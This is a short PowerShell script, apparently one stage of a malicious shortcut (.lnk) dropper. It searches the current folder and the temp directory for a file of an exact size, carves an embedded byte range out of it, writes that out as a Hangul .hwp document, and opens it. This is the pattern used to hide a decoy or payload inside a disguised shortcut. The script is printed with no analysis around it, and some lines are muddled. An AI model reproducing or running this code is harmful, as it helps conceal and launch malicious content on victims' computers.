$lk=ls -Path '.\' ;
ac -path "C:\Users\user\Downloads" $lk
$lk= Where {$lk.length -eq 56397};
ac -path "C:\Users\user\Downloads" $lk
if($lk -eq $null) {$lk=ls -Path $env:temp -depth 2 | Where {$_.length -eq 56397}};
$n=$lk.name.Replace('.lnk','.hwp');

$lk=$lk.FullName;$file = [System.IO.File]::ReadAllBytes($lk);$file1=[byte[]]$file[5709..(5709+50688-1)];

$fsdf=$lk.Replace('.lnk','.hwp');[System.IO.File]::WriteAllBytes($fsdf,$file1);
&$fsdf;







